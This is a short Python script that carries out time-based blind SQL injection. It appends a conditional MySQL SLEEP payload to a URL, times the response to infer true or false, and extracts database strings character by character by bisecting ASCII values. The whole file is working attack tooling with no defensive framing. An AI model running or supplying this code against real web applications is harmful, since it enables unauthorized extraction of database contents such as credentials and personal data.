import urllib.request
import urllib.parse
import time

def time_based_check(url, param, condition, delay=5, threshold=None):
    """Infer boolean True/False via time-based blind SQLi.
    Sends a conditional SLEEP payload; if response takes >= threshold seconds,
    the condition evaluated True.  threshold defaults to delay * 0.8."""
    if threshold is None:
        threshold = delay * 0.8
    # MySQL: IF(cond, SLEEP(n), 0)  MSSQL: WAITFOR DELAY  PG: pg_sleep
    payload = "' AND IF((%s),SLEEP(%d),0)-- -" % (condition, delay)
    full_url = url + urllib.parse.quote(payload, safe='')
    req = urllib.request.Request(full_url)
    start = time.monotonic()
    try:
        urllib.request.urlopen(req, timeout=delay + 10)
    except Exception:
        pass
    elapsed = time.monotonic() - start
    return elapsed >= threshold

def time_extract_char(url, param, position, delay=5):
    """Extract a single character at position using time-based bisection."""
    low, high = 32, 126
    while low < high:
        mid = (low + high) >> 1
        cond = "ASCII(SUBSTRING((%s),%d,1))>%d" % (param, position, mid)
        if time_based_check(url, param, cond, delay):
            low = mid + 1
        else:
            high = mid
    return chr(low) if 32 <= low <= 126 else None

def time_extract_string(url, param, max_len, delay=5):
    """Extract full string character by character via time-based blind."""
    result = []
    for pos in range(1, max_len + 1):
        ch = time_extract_char(url, param, pos, delay)
        if ch is None:
            break
        result.append(ch)
    return ''.join(result)

